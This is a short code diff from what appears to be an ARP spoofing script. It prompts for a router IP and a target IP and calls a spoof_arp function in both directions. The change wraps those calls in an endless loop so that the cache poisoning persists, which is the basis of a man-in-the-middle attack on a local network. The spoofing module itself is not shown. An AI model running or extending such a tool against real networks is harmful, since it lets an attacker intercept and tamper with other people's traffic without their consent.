@@ -14,8 +14,10 @@ router_ip = input("Enter the IP address of the router: ")
 target_ip = input("Enter the IP address of the target: ")
 
 try:
-    arp_spoofing.spoof_arp(target_ip, router_ip)
-    arp_spoofing.spoof_arp(router_ip, target_ip)
+
+    while True:
+        arp_spoofing.spoof_arp(target_ip, router_ip)
+        arp_spoofing.spoof_arp(router_ip, target_ip)
 
 except KeyboardInterrupt:
     print('\n[!] Exiting...')
